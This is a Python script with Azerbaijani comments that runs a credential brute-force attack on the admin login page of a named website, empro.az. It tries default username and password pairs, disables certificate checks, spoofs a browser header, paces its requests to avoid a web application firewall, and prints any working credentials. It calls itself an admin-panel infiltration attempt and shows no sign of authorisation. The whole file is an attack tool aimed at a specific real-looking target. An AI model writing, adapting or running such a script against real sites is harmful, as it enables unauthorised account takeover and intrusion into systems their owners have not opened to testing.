import asyncio
import httpx

TARGET_LOGIN_URL = "https://empro.az/login" # Tapdığın qapı

# Sınaq üçün ən çox yayılmış laboratoriya kombinasiyaları
USERS = ["admin", "administrator", "staff", "manager"]
PASSWORDS = [
    "admin123", "admin12345", "password", "123456", "qwerty", 
    "root", "admin@123", "superuser", "admin2024", "admin2025"
]

async def attempt_login(username, password, client):
    # Saytın daxili login forması üçün data
    # QEYD: Saytın formundakı 'name' sahələrinə görə bu datanı optimallaşdırırıq
    login_data = {
        "email": username, # Bəzi saytlarda istifadəçi adı, bəzilərində email olur
        "password": password,
        "login": "submit"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": TARGET_LOGIN_URL
    }

    try:
        response = await client.post(TARGET_LOGIN_URL, data=login_data, headers=headers, follow_redirects=False)
        
        # Əgər status 302 (Yönləndirmə) olsa, bu çox vaxt uğurlu giriş deməkdir
        if response.status_code == 302 or (response.status_code == 200 and "dashboard" in response.text.lower()):
            print(f"\n🔥 [SUCCESS] GİRİŞ ƏLDƏ EDİLDİ!")
            print(f"🚩 USERNAME: {username}")
            print(f"🚩 PASSWORD: {password}")
            print(f"🔗 DASHBOARD: {response.headers.get('Location', 'Login successful')}")
            return True
        else:
            print(f"[-] Uğursuz cəhd: {username}:{password}", end="\r")
    except Exception:
        pass
    return False

async def main():
    print(f"⚒️  ADMIN PANELƏ SIZMA CƏHDİ BAŞLADI: {TARGET_LOGIN_URL}")
    print(f"[*] Cəmi {len(USERS) * len(PASSWORDS)} kombinasiya yoxlanılır...\n")
    
    async with httpx.AsyncClient(verify=False) as client:
        found = False
        for user in USERS:
            if found: break
            for pwd in PASSWORDS:
                if await attempt_login(user, pwd, client):
                    found = True
                    break
                await asyncio.sleep(0.1) # WAF bloklamasın deyə qısa fasilə
        
        if not found:
            print("\n\n[!] Standart şifrələrlə giriş alınmadı. Daha iri lüğət (wordlist) lazımdır.")

if __name__ == "__main__":
    asyncio.run(main())
